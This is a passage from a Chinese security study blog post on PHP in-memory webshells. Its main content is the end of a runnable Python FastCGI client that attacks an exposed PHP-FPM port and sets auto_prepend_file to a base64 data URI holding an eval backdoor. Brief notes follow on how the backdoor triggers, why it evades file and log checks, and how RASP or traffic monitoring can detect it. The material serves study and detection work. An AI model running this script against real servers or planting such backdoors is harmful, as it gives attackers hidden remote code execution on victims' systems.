class="hljs-string">&#x27;__main__&#x27;</span>:<br>    parser = argparse.ArgumentParser(<br>        description=<span class="hljs-string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;host&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)<br>    parser.add_argument(<br>        <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--code&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;What php code your want to execute&#x27;</span>,<br>                        default=<span class="hljs-string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;FastCGI port&#x27;</span>,<br>                        default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br><br>    args = parser.parse_args()<br><br>    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)<br>    params = <span class="hljs-built_in">dict</span>()<br>    documentRoot = <span class="hljs-string">&quot;/&quot;</span><br>    uri = args.file<br>    content = args.code<br>    params = &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="hljs-string">&#x27;/&#x27;</span>),<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="hljs-string">&#x27;application/text&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&quot;%d&quot;</span> % <span class="hljs-built_in">len</span>(content),<br>        <span class="hljs-comment"># &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br>        <span class="hljs-comment"># &#x27;PHP_VALUE&#x27;: &#x27;&#x27;,</span><br>        <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="hljs-string">&#x27;allow_url_include = On auto_prepend_file =\&#x27;data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=\&#x27;&#x27;</span><br>    &#125;<br>    response = client.request(params, content)<br>    <span class="hljs-built_in">print</span>(force_text(response))<br><br></code></pre></td></tr></table></figure>
+
+<p>由于使用了<code>auto_prepend_file</code>，因此我们只需要访问服务器上任意一个正常的 PHP 文件，无需任何修改，都能触发我们的内存马。</p>
+<p><img src="https://img-blog.csdnimg.cn/0de5ae8f12df4da997c3c2799ba07e44.png" srcset="/img/loading.gif" lazyload alt="image-20230228185217368"></p>
+<p>​		当然，这个方案也有局限性，因为是内存马，所以他实际上是和PHP-FPM的 Worker 进程绑定的，因此，如果服务器上有多个Worker进程，我们就需要多发送刚才的请求几次，才能让我们的payload“感染”每一个进程。</p>
+<h4 id="内存马的检测"><a href="#内存马的检测" class="headerlink" title="内存马的检测"></a>内存马的检测</h4><p>​		既然是内存马，因此我们无法从代码扫描中发现。并且由于他只是修改了内存中的 PHP 配置，我们也无法从<code>PHP.ini/.user.ini/php-fpm.conf</code>等文件内容中检测。真正添加内存马由于只需要对fpm监听的端口发送请求，因此也无法从webserver的accesslog中发现问题。但是我们是可以通过rasp之类的工具，通过检查<code>auto_prepend_file/auto_append_file/allow_url_inclue</code>配置的变化（虽然目前很多 rasp 也不会做这些操作）来做检测。<br>​		另外，由于触发方式可以是任意一个 PHP 文件，所以，我们想从后续的访问行为中做检查也有一定难度，但是可以从网络流量中检查对应的后门 payload，或者从进程的行为中，来做检查。</p>
+<h4 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1720/">利用 PHP-FPM 做内存马的方法</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
+      
+        <a href="/tags/php/" class="print-no-link">#php</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内存马学习之php内存马</div>
+      <div>https://genioco.github.io/2022/05/06/Learn/内存马学习之PHP内存马/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>BadWolf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年5月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/05/06/Learn/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B9%8BPython%E5%86%85%E5%AD%98%E9%A9%AC/" title="内存马学习之Python内存马">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内存马学习之Python内存马</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/06/Learn/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B9%8BJava%E5%86%85%E5%AD%98%E9%A9%AC/" title="内存马学习之Java内存马">
+                        <span class="hidden-mobile">内存马学习之Java内存马</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"genIoco/genIoco.github.io","repo-id":"R_kgDOMU-44w","category":"General","category-id":"DIC_kwDOMU-4484CgxC5","theme-light":"light","theme-dark":"dark","mapping":"og:title","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicRibbon.js"></script>
+<script src="/js/leaves.js"></script>
+<script src="/js/containsWord.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
